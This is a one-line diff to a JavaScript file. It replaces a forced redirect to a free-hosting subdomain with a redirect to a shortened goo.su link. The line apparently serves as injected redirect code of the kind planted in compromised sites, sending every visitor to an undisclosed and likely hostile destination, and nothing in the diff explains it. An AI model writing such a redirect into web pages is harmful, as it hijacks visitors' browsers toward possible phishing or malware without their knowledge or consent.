@@ -1,1 +1,1 @@
-window.location.replace('http://f0449853.xsph.ru/pro');
+window.location.replace('https://goo.su/2jLn');
